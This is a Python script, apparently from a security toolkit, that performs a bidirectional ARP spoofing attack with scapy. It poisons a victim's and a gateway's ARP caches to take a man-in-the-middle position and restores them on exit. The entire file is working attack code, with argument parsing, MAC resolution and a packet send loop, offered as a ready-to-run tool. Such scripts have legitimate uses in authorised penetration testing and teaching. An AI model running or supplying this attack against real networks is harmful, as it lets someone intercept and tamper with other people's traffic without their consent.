#!/usr/bin/env python3
"""Bidirectional ARP spoof (MITM between target and gateway) with restore.

MAC octets are HEX — resolve with getmacbyip or convert via bytes.fromhex;
never struct.pack("B", <string>) (round-0 struct.error crash; see SKILL.md).
Restores both ARP caches in a finally block even on Ctrl-C.

Usage: arp_spoof.py <target-ip> <gateway-ip> [--iface IFACE] [--interval SEC]
                    [--duration SEC]
"""

from __future__ import annotations

import argparse
import ipaddress
import os
import sys
import time


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="arp_spoof.py",
        description="Bidirectional ARP spoof between <target-ip> and <gateway-ip>, restore on exit.",
    )
    parser.add_argument("target", help="victim IP (e.g. 192.162.18.2)")
    parser.add_argument(
        "gateway", help="IP to impersonate toward the victim (e.g. 192.162.18.1)"
    )
    parser.add_argument(
        "--iface", default=None, help="interface (default: scapy conf.iface)"
    )
    parser.add_argument(
        "--interval", type=float, default=2.0, help="seconds between bursts (default 2)"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=0,
        help="stop after N seconds (0 = until Ctrl-C)",
    )
    return parser


def _validate(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    for label, value in (("target", args.target), ("gateway", args.gateway)):
        try:
            ipaddress.ip_address(value)
        except ValueError:
            parser.error(f"invalid {label} IP: {value!r}")
    if args.iface is not None and (not args.iface or args.iface.startswith("-")):
        parser.error(f"invalid interface: {args.iface!r}")
    if args.interval <= 0:
        parser.error("--interval must be positive")
    if args.duration < 0:
        parser.error("--duration must be >= 0")


def main() -> int:
    parser = _build_parser()
    args = parser.parse_args()
    _validate(parser, args)
    if os.name == "posix" and os.geteuid() != 0:
        print(
            "arp_spoof.py: warning — raw sockets usually require root / CAP_NET_RAW",
            file=sys.stderr,
        )
    from scapy.all import ARP, Ether, conf, getmacbyip, sendp

    send_kwargs: dict[str, object] = {}
    if args.iface:
        send_kwargs["iface"] = args.iface
    tmac = getmacbyip(args.target)
    gmac = getmacbyip(args.gateway)
    if not tmac or not gmac:
        print(
            "arp_spoof.py: could not resolve MACs — target and gateway must ARP-reply "
            "first (run scripts/arp_scan.py)",
            file=sys.stderr,
        )
        return 3
    our = conf.iface.mac
    t_spoof = Ether(dst=tmac, src=our) / ARP(
        op=2, psrc=args.gateway, pdst=args.target, hwdst=tmac, hwsrc=our
    )
    g_spoof = Ether(dst=gmac, src=our) / ARP(
        op=2, psrc=args.target, pdst=args.gateway, hwdst=gmac, hwsrc=our
    )
    t_restore = Ether(dst=tmac) / ARP(
        op=2, psrc=args.gateway, pdst=args.target, hwdst=tmac, hwsrc=gmac
    )
    g_restore = Ether(dst=gmac) / ARP(
        op=2, psrc=args.target, pdst=args.gateway, hwdst=gmac, hwsrc=tmac
    )
    print(
        f"## ARP spoof {args.target} <-> {args.gateway} "
        f"(iface {args.iface or str(conf.iface)}; Ctrl-C to restore)\n"
    )
    sent = 0
    deadline = time.time() + args.duration if args.duration else None
    try:
        while deadline is None or time.time() < deadline:
            sendp(t_spoof, verbose=0, **send_kwargs)
            sendp(g_spoof, verbose=0, **send_kwargs)
            sent += 2
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("interrupted; restoring")
    finally:
        for _ in range(3):
            sendp(t_restore, verbose=0, **send_kwargs)
            sendp(g_restore, verbose=0, **send_kwargs)
        print(f"restored ARP caches after {sent} spoof packets")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
